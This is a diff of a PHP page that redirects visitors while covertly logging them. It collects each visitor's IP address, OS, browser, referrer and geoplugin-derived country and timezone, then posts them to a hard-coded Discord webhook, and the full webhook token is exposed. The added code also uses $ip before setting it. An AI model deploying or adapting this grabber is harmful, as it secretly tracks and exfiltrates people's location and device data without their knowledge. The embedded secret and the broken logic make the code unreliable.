@@ -1,5 +1,5 @@
 <?php
-header( 'Location: OSOInspiration.html' ) ;
+header( 'Location: index.html' ) ;
 $user_agent     =   $_SERVER['HTTP_USER_AGENT'];
 function getOS() { 
     global $user_agent;
@@ -21,7 +21,7 @@ function getOS() {
                             '/macintosh|mac os x/i' =>  'Mac OS X',
                             '/mac_powerpc/i'        =>  'Mac OS 9',
                             '/linux/i'              =>  'Linux',
-			    '/kalilinux/i'          =>  'Wannabe Hacker',
+			                '/kalilinux/i'          =>  'Wannabe Hacker',
                             '/ubuntu/i'             =>  'Ubuntu',
                             '/iphone/i'             =>  'iPhone',
                             '/ipod/i'               =>  'iPod',
@@ -29,7 +29,7 @@ function getOS() {
                             '/android/i'            =>  'Android',
                             '/blackberry/i'         =>  'BlackBerry',
                             '/webos/i'              =>  'Mobile',
-			    '/Windows Phone/i'      =>  'Windows Phone'
+			                '/Windows Phone/i'      =>  'Windows Phone'
                         );
     foreach ($os_array as $regex => $value) { 
         if (preg_match($regex, $user_agent)) {
@@ -62,18 +62,33 @@ function getBrowser() {
 $user_os        =   getOS();
 $user_browser   =   getBrowser();
 
-$ip = $_SERVER['HTTP_CLIENT_IP'];
-$site_refer = $_SERVER['HTTP_REFERER'];
+
+
+$host = gethostbyaddr($ip);
+   $site_refer = $_SERVER['HTTP_REFERER'];{
+       
+    if ( !empty($_SERVER['HTTP_CLIENT_IP']) ) {
+        // Check IP from internet.
+        $ip = $_SERVER['HTTP_CLIENT_IP'];
+       } elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR']) ) {
+        // Check IP is passed from proxy.
+        $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
+       } else {
+        // Get IP address from remote address.
+        $ip = $_SERVER['REMOTE_ADDR'];
+       }
 	if($site_refer == ""){
 		$site = "dirrect connection";
 	}
 else{
 		$site = $site_refer;
-	}
+    }
+}
+$ipdat = @json_decode(file_get_contents( 
+    "http://www.geoplugin.net/json.gp?ip=" . $ip)); 
 $time = date('Y-m-d H:i:s');
-$make_json = json_encode(array('content'=>"Inspiration | $ip | $user_os | $user_browser | $time \n", "username" => "$ip"));
-
-$exec = curl_init("https://discordapp.com/api/webhooks/783278384377102388/eRFWws-eeOKdRft9rz54bbX5_uoYa84-ViqU23zWB1QWtZvQcwNJayOnPPkDmFTL4WCY"); //<------------     WEBHOOK HERE                                                                               <-----------      WEBHOOK ON THIS LINE
+$make_json = json_encode(array('content'=>"Inspiration  | $ipdat->geoplugin_countryName | $ipdat->geoplugin_continentName | $ipdat->geoplugin_currencyCode | $ipdat->geoplugin_timezone | $ip | $user_os | $user_browser | $time \n", "username" => "$ip"));
+$exec = curl_init("https://discordapp.com/api/webhooks/783278384377102388/eRFWws-eeOKdRft9rz54bbX5_uoYa84-ViqU23zWB1QWtZvQcwNJayOnPPkDmFTL4WCY");
 curl_setopt( $exec, CURLOPT_HTTPHEADER, array('Content-type: application/json'));
 curl_setopt( $exec, CURLOPT_POST, 1);
 curl_setopt( $exec, CURLOPT_POSTFIELDS, $make_json);
